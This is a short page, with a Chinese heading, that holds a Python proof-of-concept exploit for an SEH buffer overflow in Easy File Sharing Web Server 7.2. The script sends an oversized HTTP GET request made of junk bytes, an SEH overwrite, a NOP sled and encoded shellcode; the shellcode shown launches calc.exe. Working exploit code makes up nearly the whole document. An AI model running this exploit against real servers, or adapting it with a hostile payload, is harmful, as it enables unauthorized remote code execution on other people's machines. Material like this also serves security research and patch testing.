### Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)

### POC

```python

# Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port

import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

a = socket.socket()

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

entire=4500

# Junk
buff = "A"*4061

# Next SEH
buff+= "\xeb\x0A\x90\x90"

# pop pop ret
buff+= "\x98\x97\x01\x10"

buff+= "\x90"*19

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
buff+= shellcode

buff+= "\x90"*7

buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)

# GET
a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
```
